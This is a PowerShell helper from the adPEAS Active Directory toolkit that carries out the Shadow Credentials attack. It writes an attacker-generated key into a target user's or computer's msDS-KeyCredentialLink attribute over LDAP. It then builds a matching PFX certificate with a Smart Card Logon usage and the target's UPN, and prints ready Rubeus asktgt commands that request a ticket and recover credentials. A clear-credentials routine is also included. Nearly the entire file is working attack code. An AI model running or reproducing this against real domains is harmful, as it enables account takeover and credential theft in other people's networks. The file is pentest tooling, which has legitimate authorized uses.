function Invoke-ShadowCredentialOperation {
<#
.SYNOPSIS
    Helper function for Shadow Credential (msDS-KeyCredentialLink) operations.

.DESCRIPTION
    Invoke-ShadowCredentialOperation is a centralized helper function that handles
    Shadow Credential operations for both user and computer objects. It eliminates
    code duplication between Set-DomainUser and Set-DomainComputer.

    Uses ModifyRequest via $Script:LdapConnection for all LDAP modifications,
    ensuring compatibility with all authentication methods including Kerberos PTT.

    Supports:
    - Adding Shadow Credentials (generates RSA key, creates PFX)
    - Clearing Shadow Credentials (single, specific by DeviceID, or all)

.PARAMETER TargetDN
    Distinguished Name of the target object.

.PARAMETER TargetSAMAccountName
    sAMAccountName of the target object.

.PARAMETER TargetType
    Type of target object: 'User' or 'Computer'.

.PARAMETER TargetUPN
    User Principal Name for the certificate SAN (optional for users with existing UPN).

.PARAMETER AddShadowCredential
    Switch to add a new Shadow Credential.

.PARAMETER ClearShadowCredentials
    Switch to clear Shadow Credentials.

.PARAMETER DeviceID
    Device GUID for operations.
    With -AddShadowCredential: Optional custom Device ID.
    With -ClearShadowCredentials: Specific DeviceID to remove.

.PARAMETER Force
    Remove all credentials (with -ClearShadowCredentials).

.PARAMETER PassThru
    Return result object instead of console output.

.NOTES
    Author: Alexander Sturz (@_61106960_)
    Internal helper function - not exported directly.
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$TargetDN,

        [Parameter(Mandatory)]
        [string]$TargetSAMAccountName,

        [Parameter(Mandatory)]
        [ValidateSet('User', 'Computer')]
        [string]$TargetType,

        [string]$TargetUPN,

        [Parameter(ParameterSetName='Add', Mandatory)]
        [switch]$AddShadowCredential,

        [Parameter(ParameterSetName='Clear', Mandatory)]
        [switch]$ClearShadowCredentials,

        [string]$DeviceID,

        [Parameter(ParameterSetName='Clear')]
        [switch]$Force,

        [switch]$NoPassword,

        [switch]$PassThru
    )

    $FunctionPrefix = "[Invoke-ShadowCredentialOperation]"

    if ($PSCmdlet.ParameterSetName -eq 'Add') {
        # ===== AddShadowCredential Operation =====
        Write-Log "$FunctionPrefix Adding Shadow Credential to: $TargetSAMAccountName"

        $RSA = $null
        try {
            # Generate RSA key pair (2048 bit)
            Write-Log "$FunctionPrefix Generating RSA key pair..."
            $RSA = [System.Security.Cryptography.RSA]::Create(2048)

            # Generate GUIDs
            $DeviceGUID = if ($DeviceID) { [GUID]$DeviceID } else { [GUID]::NewGuid() }
            $KeyGUID = [GUID]::NewGuid()

            Write-Log "$FunctionPrefix Device ID: $DeviceGUID"
            Write-Log "$FunctionPrefix Key ID: $KeyGUID"

            # Get RSA parameters for public key
            $RSAParams = $RSA.ExportParameters($false)  # false = public key only

            # Build BCRYPT_RSAKEY_BLOB structure for the public key
            $KeyBlob = New-Object System.Collections.ArrayList

            # BCRYPT_RSAKEY_BLOB header (24 bytes)
            # Magic: BCRYPT_RSAPUBLIC_MAGIC = 0x31415352 ("RSA1")
            [void]$KeyBlob.AddRange([BitConverter]::GetBytes([UInt32]0x31415352))
            # BitLength
            [void]$KeyBlob.AddRange([BitConverter]::GetBytes([UInt32]2048))
            # cbPublicExp (exponent length)
            [void]$KeyBlob.AddRange([BitConverter]::GetBytes([UInt32]$RSAParams.Exponent.Length))
            # cbModulus (modulus length)
            [void]$KeyBlob.AddRange([BitConverter]::GetBytes([UInt32]$RSAParams.Modulus.Length))
            # cbPrime1 (not used for public key)
            [void]$KeyBlob.AddRange([BitConverter]::GetBytes([UInt32]0))
            # cbPrime2 (not used for public key)
            [void]$KeyBlob.AddRange([BitConverter]::GetBytes([UInt32]0))

            # Exponent
            [void]$KeyBlob.AddRange($RSAParams.Exponent)
            # Modulus
            [void]$KeyBlob.AddRange($RSAParams.Modulus)

            $PublicKeyBytes = [byte[]]$KeyBlob.ToArray()

            # Compute SHA256 hash of the public key (KeyID)
            $SHA256 = [System.Security.Cryptography.SHA256]::Create()
            $KeyHash = $SHA256.ComputeHash($PublicKeyBytes)
            $SHA256.Dispose()

            # Build KeyCredentialLink structure (DN-Binary format)
            # MS-ADTS 2.2.19 KEYCREDENTIALLINK_BLOB
            # Format is LTV (Length-Type-Value), NOT TLV!

            # First, build entries 3-9 (needed for KeyHash calculation)
            $EntriesAfterKeyHash = New-Object System.Collections.ArrayList
            $CurrentFileTime = [DateTime]::UtcNow.ToFileTimeUtc()

            # Entry Type 0x03: KeyMaterial (BCRYPT_RSAKEY_BLOB)
            Add-KeyCredentialLinkEntry -EntryType 0x03 -Data $PublicKeyBytes -Target $EntriesAfterKeyHash

            # Entry Type 0x04: KeyUsage (1 byte: 0x01 = NGC)
            Add-KeyCredentialLinkEntry -EntryType 0x04 -Data @([byte]0x01) -Target $EntriesAfterKeyHash

            # Entry Type 0x05: KeySource (1 byte: 0x00 = AD)
            Add-KeyCredentialLinkEntry -EntryType 0x05 -Data @([byte]0x00) -Target $EntriesAfterKeyHash

            # Entry Type 0x06: DeviceId (GUID)
            Add-KeyCredentialLinkEntry -EntryType 0x06 -Data $DeviceGUID.ToByteArray() -Target $EntriesAfterKeyHash

            # Entry Type 0x07: CustomKeyInformation (Version + Flags)
            Add-KeyCredentialLinkEntry -EntryType 0x07 -Data @([byte]0x01, [byte]0x00) -Target $EntriesAfterKeyHash

            # Entry Type 0x08: KeyApproximateLastLogonTimeStamp (FILETIME)
            Add-KeyCredentialLinkEntry -EntryType 0x08 -Data ([BitConverter]::GetBytes($CurrentFileTime)) -Target $EntriesAfterKeyHash

            # Entry Type 0x09: KeyCreationTime (FILETIME)
            Add-KeyCredentialLinkEntry -EntryType 0x09 -Data ([BitConverter]::GetBytes($CurrentFileTime)) -Target $EntriesAfterKeyHash

            # Calculate KeyHash: SHA256 of entries 3-9
            $SHA256ForHash = [System.Security.Cryptography.SHA256]::Create()
            $KeyHashValue = $SHA256ForHash.ComputeHash([byte[]]$EntriesAfterKeyHash.ToArray())
            $SHA256ForHash.Dispose()

            # Now build the complete entry list
            $KeyCredentialEntries = New-Object System.Collections.ArrayList

            # Entry Type 0x01: KeyID (SHA256 hash of public key material)
            Add-KeyCredentialLinkEntry -EntryType 0x01 -Data $KeyHash -Target $KeyCredentialEntries

            # Entry Type 0x02: KeyHash (SHA256 of entries 3-9)
            Add-KeyCredentialLinkEntry -EntryType 0x02 -Data $KeyHashValue -Target $KeyCredentialEntries

            # Add entries 3-9
            [void]$KeyCredentialEntries.AddRange($EntriesAfterKeyHash.ToArray())

            # Build final KeyCredentialLink blob
            $KeyCredentialBlob = New-Object System.Collections.ArrayList

            # Version (4 bytes): 0x00000200 for version 2
            [void]$KeyCredentialBlob.AddRange([BitConverter]::GetBytes([UInt32]0x00000200))

            # Entries
            [void]$KeyCredentialBlob.AddRange($KeyCredentialEntries.ToArray())

            $KeyCredentialBytes = [byte[]]$KeyCredentialBlob.ToArray()

            # Create DN-Binary string (format: B:<length>:<hex>:<dn>)
            $HexString = [BitConverter]::ToString($KeyCredentialBytes) -replace '-', ''
            $DNBinaryValue = "B:$($HexString.Length):$HexString`:$TargetDN"

            Write-Log "$FunctionPrefix KeyCredentialLink DN-Binary length: $($KeyCredentialBytes.Length) bytes"

            # Add Shadow Credential via ModifyRequest (works with all auth methods including Kerberos PTT)
            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
            $ModifyRequest.DistinguishedName = $TargetDN

            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
            $Modification.Name = "msDS-KeyCredentialLink"
            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Add
            $Modification.Add($DNBinaryValue) | Out-Null

            $ModifyRequest.Modifications.Add($Modification) | Out-Null

            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)

            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
            }

            Write-Log "$FunctionPrefix Shadow Credential added to AD, creating PFX certificate..."

            # Generate certificate password (using safe characters)
            if ($NoPassword) {
                $CertPassword = $null
            }
            else {
                $CertPassword = New-SafePassword -Length 20
            }

            # Create self-signed certificate using the SAME RSA key
            # Requires .NET 4.7.2+ (CertificateRequest class)
            try {
                [void][System.Security.Cryptography.X509Certificates.CertificateRequest]

                $SubjectName = "CN=$TargetSAMAccountName"
                $Subject = New-Object System.Security.Cryptography.X509Certificates.X500DistinguishedName($SubjectName)

                $CertRequest = New-Object System.Security.Cryptography.X509Certificates.CertificateRequest(
                    $Subject,
                    $RSA,
                    [System.Security.Cryptography.HashAlgorithmName]::SHA256,
                    [System.Security.Cryptography.RSASignaturePadding]::Pkcs1
                )

                # Add Enhanced Key Usage for PKINIT authentication
                $OidCollection = New-Object System.Security.Cryptography.OidCollection
                [void]$OidCollection.Add((New-Object System.Security.Cryptography.Oid("1.3.6.1.5.5.7.3.2")))  # Client Authentication
                [void]$OidCollection.Add((New-Object System.Security.Cryptography.Oid("1.3.6.1.4.1.311.20.2.2")))  # Smart Card Logon
                $EkuExtension = New-Object System.Security.Cryptography.X509Certificates.X509EnhancedKeyUsageExtension($OidCollection, $false)
                $CertRequest.CertificateExtensions.Add($EkuExtension)

                # Add Key Usage extension
                $KeyUsageExtension = New-Object System.Security.Cryptography.X509Certificates.X509KeyUsageExtension(
                    ([System.Security.Cryptography.X509Certificates.X509KeyUsageFlags]::DigitalSignature -bor [System.Security.Cryptography.X509Certificates.X509KeyUsageFlags]::KeyEncipherment),
                    $false
                )
                $CertRequest.CertificateExtensions.Add($KeyUsageExtension)

                # Determine UPN for certificate SAN
                $CertUPN = if ($TargetUPN) {
                    $TargetUPN
                } else {
                    # For computers: COMPUTERNAME$@REALM, for users: user@REALM
                    "$TargetSAMAccountName@$($Script:LDAPContext.Domain.ToUpper())"
                }
                Write-Log "$FunctionPrefix Adding UPN to certificate SAN: $CertUPN"

                # Build SAN extension with UPN
                $UPNBytes = [System.Text.Encoding]::UTF8.GetBytes($CertUPN)
                $UPNOID = @(0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x14, 0x02, 0x03)

                $UTF8Tag = 0x0C
                $UPNValueASN1 = @($UTF8Tag) + $(if ($UPNBytes.Length -lt 128) { @([byte]$UPNBytes.Length) } else { @(0x82, [byte](($UPNBytes.Length -shr 8) -band 0xFF), [byte]($UPNBytes.Length -band 0xFF)) }) + $UPNBytes

                $Context0Content = [byte[]]$UPNValueASN1
                $Context0 = @(0xA0) + $(if ($Context0Content.Length -lt 128) { @([byte]$Context0Content.Length) } else { @(0x82, [byte](($Context0Content.Length -shr 8) -band 0xFF), [byte]($Context0Content.Length -band 0xFF)) }) + $Context0Content

                $OtherNameContent = [byte[]]$UPNOID + [byte[]]$Context0
                $GeneralName = @(0xA0) + $(if ($OtherNameContent.Length -lt 128) { @([byte]$OtherNameContent.Length) } else { @(0x82, [byte](($OtherNameContent.Length -shr 8) -band 0xFF), [byte]($OtherNameContent.Length -band 0xFF)) }) + $OtherNameContent

                $GeneralNamesContent = [byte[]]$GeneralName
                $SANValue = @(0x30) + $(if ($GeneralNamesContent.Length -lt 128) { @([byte]$GeneralNamesContent.Length) } else { @(0x82, [byte](($GeneralNamesContent.Length -shr 8) -band 0xFF), [byte]($GeneralNamesContent.Length -band 0xFF)) }) + $GeneralNamesContent

                $SANExtension = New-Object System.Security.Cryptography.X509Certificates.X509Extension(
                    (New-Object System.Security.Cryptography.Oid("2.5.29.17")),
                    [byte[]]$SANValue,
                    $false
                )
                $CertRequest.CertificateExtensions.Add($SANExtension)
                Write-Log "$FunctionPrefix SAN extension added with UPN: $CertUPN"

                # Create self-signed certificate (valid for 10 years)
                # Note: The KDC only validates the key material in msDS-KeyCredentialLink,
                # not the certificate validity period. Long validity avoids user confusion.
                $NotBefore = [DateTime]::UtcNow.AddDays(-1)
                $NotAfter = [DateTime]::UtcNow.AddYears(10)
                $Cert = $CertRequest.CreateSelfSigned($NotBefore, $NotAfter)

                Write-Log "$FunctionPrefix Certificate created using CertificateRequest with matching keypair"
            } catch {
                Write-Log "$FunctionPrefix CertificateRequest not available: $_"
                throw "Failed to create certificate: .NET 4.7.2+ with CertificateRequest is required for Shadow Credentials"
            }

            # Export as PFX
            if ($CertPassword) {
                $SecureCertPassword = ConvertTo-SecureString -String $CertPassword -AsPlainText -Force
                $PFXBytes = $Cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, $SecureCertPassword)
            }
            else {
                $PFXBytes = $Cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx)
            }

            # Determine output path
            $Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
            $PFXPath = "${TargetSAMAccountName}_$Timestamp.pfx"

            # Save PFX file using central Export-adPEASFile helper
            $exportResult = Export-adPEASFile -Path $PFXPath -Content $PFXBytes -Type Binary -SanitizeFilename -Force
            if (-not $exportResult.Success) {
                Write-Error "$FunctionPrefix Failed to save PFX: $($exportResult.Message)"
                return $null
            }
            $PFXPath = $exportResult.Path

            if ($Cert) { $Cert.Dispose() }

            if ($PassThru) {
                return [PSCustomObject]@{
                    Operation = "AddShadowCredential"
                    $TargetType = $TargetSAMAccountName
                    DistinguishedName = $TargetDN
                    DeviceID = $DeviceGUID.ToString()
                    KeyID = [Convert]::ToBase64String($KeyHash)
                    PFXPath = $PFXPath
                    PFXPassword = if ($CertPassword) { $CertPassword } else { $null }
                    Success = $true
                    Message = "Shadow Credential successfully added. Certificate saved as PFX."
                }
            } else {
                Show-Line "Successfully added Shadow Credential to: $TargetSAMAccountName" -Class Hint
                Show-KeyValue "Device ID:" $DeviceGUID
                Show-KeyValue "Key ID:" $([Convert]::ToBase64String($KeyHash))
                Show-KeyValue "PFX Path:" $PFXPath
                if ($CertPassword) {
                    Show-KeyValue "PFX Password:" $CertPassword
                } else {
                    Show-KeyValue "PFX Password:" "(none)" -Class Note
                }
                Show-EmptyLine
                Show-Line "Usage with Rubeus:" -Class Note
                if ($CertPassword) {
                    Show-Line "Rubeus.exe asktgt /user:$TargetSAMAccountName /certificate:$PFXPath /password:`"$CertPassword`" /domain:$($Script:LDAPContext.Domain) /dc:$($Script:LDAPContext.Server) /getcredentials /show"
                } else {
                    Show-Line "Rubeus.exe asktgt /user:$TargetSAMAccountName /certificate:$PFXPath /domain:$($Script:LDAPContext.Domain) /dc:$($Script:LDAPContext.Server) /getcredentials /show"
                }
                Show-EmptyLine
                Show-Line "Usage with adPEAS Connect-adPEAS:" -Class Note
                if ($CertPassword) {
                    Show-Line "Connect-adPEAS -Domain $($Script:LDAPContext.Domain) -Certificate `'$PFXPath`' -CertificatePassword `'$CertPassword`'"
                } else {
                    Show-Line "Connect-adPEAS -Domain $($Script:LDAPContext.Domain) -Certificate `'$PFXPath`'"
                }
            }
        } catch {
            throw "Failed to add Shadow Credential: $_"
        } finally {
            # Ensure RSA key is disposed even on error
            if ($RSA) { $RSA.Dispose() }
        }
    }
    else {
        # ===== ClearShadowCredentials Operation =====
        Write-Log "$FunctionPrefix Clearing Shadow Credentials from: $TargetSAMAccountName"

        try {
            # Read existing msDS-KeyCredentialLink values via Invoke-LDAPSearch
            $SearchResult = Invoke-LDAPSearch -Filter "(distinguishedName=$TargetDN)" -Properties @('msDS-KeyCredentialLink') -SizeLimit 1
            $ExistingCredentials = @()
            if ($SearchResult -and $SearchResult.'msDS-KeyCredentialLink') {
                $RawValues = $SearchResult.'msDS-KeyCredentialLink'
                if ($RawValues -is [string]) {
                    $ExistingCredentials = @($RawValues)
                } else {
                    foreach ($val in $RawValues) {
                        $ExistingCredentials += $val.ToString()
                    }
                }
            }

            $CredentialCount = $ExistingCredentials.Count
            Write-Log "$FunctionPrefix Found $CredentialCount Shadow Credential(s)"

            if ($CredentialCount -eq 0) {
                if ($PassThru) {
                    return [PSCustomObject]@{
                        Operation = "ClearShadowCredentials"
                        $TargetType = $TargetSAMAccountName
                        DistinguishedName = $TargetDN
                        Success = $true
                        Message = "No Shadow Credentials to clear"
                    }
                } else {
                    Show-Line "No Shadow Credentials found on: $TargetSAMAccountName" -Class Note
                }
                return $null
            }

            # Parse all existing KeyCredentialLink entries
            $ParsedCredentials = @()
            foreach ($CredString in $ExistingCredentials) {
                # Parse DN-Binary format: B:<hexlength>:<hex>:<dn>
                if ($CredString -match '^B:(\d+):([0-9A-Fa-f]+):(.+)$') {
                    $HexData = $Matches[2]

                    # Convert hex to bytes
                    $KeyCredBytes = [byte[]]::new($HexData.Length / 2)
                    for ($i = 0; $i -lt $HexData.Length; $i += 2) {
                        $KeyCredBytes[$i / 2] = [Convert]::ToByte($HexData.Substring($i, 2), 16)
                    }

                    $ParsedCred = @{
                        RawString = $CredString
                        DeviceID = $null
                        KeyID = $null
                        CreationTime = $null
                    }

                    # Parse LTV entries starting at offset 4
                    $offset = 4
                    while ($offset + 3 -le $KeyCredBytes.Length) {
                        $EntryLength = [BitConverter]::ToUInt16($KeyCredBytes, $offset)
                        $offset += 2
                        $EntryType = $KeyCredBytes[$offset]
                        $offset += 1

                        if ($offset + $EntryLength -gt $KeyCredBytes.Length) { break }

                        $EntryData = if ($EntryLength -gt 0) { [byte[]]$KeyCredBytes[$offset..($offset + $EntryLength - 1)] } else { @() }

                        switch ($EntryType) {
                            0x01 { $ParsedCred.KeyID = [Convert]::ToBase64String($EntryData) }
                            0x06 {
                                if ($EntryData.Length -eq 16) {
                                    $ParsedCred.DeviceID = (New-Object GUID(,[byte[]]$EntryData)).ToString()
                                }
                            }
                            0x09 {
                                if ($EntryData.Length -eq 8) {
                                    $FileTime = [BitConverter]::ToInt64($EntryData, 0)
                                    if ($FileTime -gt 0) {
                                        $ParsedCred.CreationTime = [DateTime]::FromFileTimeUtc($FileTime)
                                    }
                                }
                            }
                        }

                        $offset += $EntryLength
                    }

                    $ParsedCredentials += [PSCustomObject]$ParsedCred
                }
            }

            # Decision logic
            if ($DeviceID) {
                # Remove specific DeviceID
                $NormalizedInputGUID = $null
                $CleanInput = $DeviceID.Trim().ToLower()

                if ($CleanInput -match '^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$') {
                    $NormalizedInputGUID = $CleanInput
                }
                elseif ($CleanInput -match '^[0-9a-f]{32}$') {
                    $rawBytes = [byte[]]::new(16)
                    for ($i = 0; $i -lt 32; $i += 2) {
                        $rawBytes[$i / 2] = [Convert]::ToByte($CleanInput.Substring($i, 2), 16)
                    }
                    $NormalizedInputGUID = (New-Object GUID(,[byte[]]$rawBytes)).ToString().ToLower()
                    Write-Log "$FunctionPrefix Converted raw hex to GUID '$NormalizedInputGUID'"
                }
                else {
                    $NormalizedInputGUID = $CleanInput.Replace('-', '')
                }

                # Find the credential to remove (need both ParsedCred and index for RawString)
                $CredToRemoveIndex = -1
                for ($idx = 0; $idx -lt $ParsedCredentials.Count; $idx++) {
                    $pc = $ParsedCredentials[$idx]
                    if (-not $pc.DeviceID) { continue }
                    $StoredGUID = $pc.DeviceID.ToLower()
                    if (($StoredGUID -eq $NormalizedInputGUID) -or
                        ($StoredGUID.Replace('-', '') -eq $NormalizedInputGUID.Replace('-', ''))) {
                        $CredToRemoveIndex = $idx
                        break
                    }
                }

                if ($CredToRemoveIndex -eq -1) {
                    if ($PassThru) {
                        return [PSCustomObject]@{
                            Operation = "ClearShadowCredentials"
                            $TargetType = $TargetSAMAccountName
                            DistinguishedName = $TargetDN
                            Success = $false
                            Message = "DeviceID '$DeviceID' not found"
                            ExistingCredentials = $ParsedCredentials
                        }
                    } else {
                        Write-Warning "[!] No Shadow Credential with DeviceID '$DeviceID' found on: $TargetSAMAccountName"
                        Show-EmptyLine
                        Show-Line "Existing Shadow Credentials:" -Class Hint

                        foreach ($cred in $ParsedCredentials) {
                            Show-KeyValue "DeviceID:" $cred.DeviceID
                            Show-KeyValue "KeyID:" $cred.KeyID
                            if ($cred.CreationTime) {
                                Show-KeyValue "Created:" "$($cred.CreationTime.ToString('yyyy-MM-dd HH:mm:ss')) UTC"
                            }
                            Show-EmptyLine
                        }
                    }
                    return $null
                }

                # Remove specific credential via ModifyRequest Delete (remove single value)
                $ValueToRemove = $ParsedCredentials[$CredToRemoveIndex].RawString
                $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                $ModifyRequest.DistinguishedName = $TargetDN

                $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                $Modification.Name = "msDS-KeyCredentialLink"
                $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete
                $Modification.Add($ValueToRemove) | Out-Null

                $ModifyRequest.Modifications.Add($Modification) | Out-Null

                $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                    throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                }

                if ($PassThru) {
                    return [PSCustomObject]@{
                        Operation = "ClearShadowCredentials"
                        $TargetType = $TargetSAMAccountName
                        DistinguishedName = $TargetDN
                        RemovedDeviceID = $DeviceID
                        RemainingCount = $CredentialCount - 1
                        Success = $true
                        Message = "Shadow Credential with DeviceID '$DeviceID' removed"
                    }
                } else {
                    Show-Line "Successfully removed Shadow Credential with DeviceID '$DeviceID' from: $TargetSAMAccountName" -Class Hint
                }

            } elseif ($CredentialCount -eq 1) {
                # Clear single credential via ModifyRequest
                $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                $ModifyRequest.DistinguishedName = $TargetDN

                $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                $Modification.Name = "msDS-KeyCredentialLink"
                $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete

                $ModifyRequest.Modifications.Add($Modification) | Out-Null

                $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                    throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                }

                if ($PassThru) {
                    return [PSCustomObject]@{
                        Operation = "ClearShadowCredentials"
                        $TargetType = $TargetSAMAccountName
                        DistinguishedName = $TargetDN
                        ClearedCount = 1
                        Success = $true
                        Message = "Shadow Credential successfully cleared"
                    }
                } else {
                    Show-Line "Successfully cleared Shadow Credential from: $TargetSAMAccountName" -Class Hint
                }

            } elseif ($Force) {
                # Clear all credentials via ModifyRequest
                $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                $ModifyRequest.DistinguishedName = $TargetDN

                $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                $Modification.Name = "msDS-KeyCredentialLink"
                $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete

                $ModifyRequest.Modifications.Add($Modification) | Out-Null

                $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                    throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                }

                if ($PassThru) {
                    return [PSCustomObject]@{
                        Operation = "ClearShadowCredentials"
                        $TargetType = $TargetSAMAccountName
                        DistinguishedName = $TargetDN
                        ClearedCount = $CredentialCount
                        Success = $true
                        Message = "All $CredentialCount Shadow Credentials successfully cleared"
                    }
                } else {
                    Show-Line "Successfully cleared all $CredentialCount Shadow Credentials from: $TargetSAMAccountName" -Class Hint
                }

            } else {
                # Multiple entries, no Force, no specific DeviceID
                if ($PassThru) {
                    return [PSCustomObject]@{
                        Operation = "ClearShadowCredentials"
                        $TargetType = $TargetSAMAccountName
                        DistinguishedName = $TargetDN
                        CredentialCount = $CredentialCount
                        ExistingCredentials = $ParsedCredentials
                        Success = $false
                        Message = "Multiple credentials found. Use -DeviceID <GUID> or -Force to proceed."
                    }
                } else {
                    Write-Warning "[!] Multiple Shadow Credentials ($CredentialCount) found on: $TargetSAMAccountName"
                    Show-EmptyLine
                    Show-Line "To delete a specific credential, use: -DeviceID <GUID>" -Class Note
                    Show-Line "To delete ALL credentials, use: -Force" -Class Note
                    Show-EmptyLine
                    Show-Line "Existing Shadow Credentials:" -Class Hint

                    $index = 1
                    foreach ($cred in $ParsedCredentials) {
                        Show-KeyValue "[$index] DeviceID:" $cred.DeviceID
                        Show-KeyValue "    KeyID:" $cred.KeyID
                        if ($cred.CreationTime) {
                            Show-KeyValue "    Created:" "$($cred.CreationTime.ToString('yyyy-MM-dd HH:mm:ss')) UTC"
                        }
                        Show-EmptyLine
                        $index++
                    }
                }
            }
        } catch {
            throw "Failed to clear Shadow Credentials: $_"
        }
    }
}

# Helper function to add LTV entry to KeyCredentialLink
function Add-KeyCredentialLinkEntry {
    param(
        [byte]$EntryType,
        [byte[]]$Data,
        [System.Collections.ArrayList]$Target
    )
    # Length (2 bytes, little-endian) - length of Value field only
    [void]$Target.AddRange([BitConverter]::GetBytes([UInt16]$Data.Length))
    # EntryType (1 byte)
    [void]$Target.Add($EntryType)
    # Value (n bytes)
    [void]$Target.AddRange($Data)
}
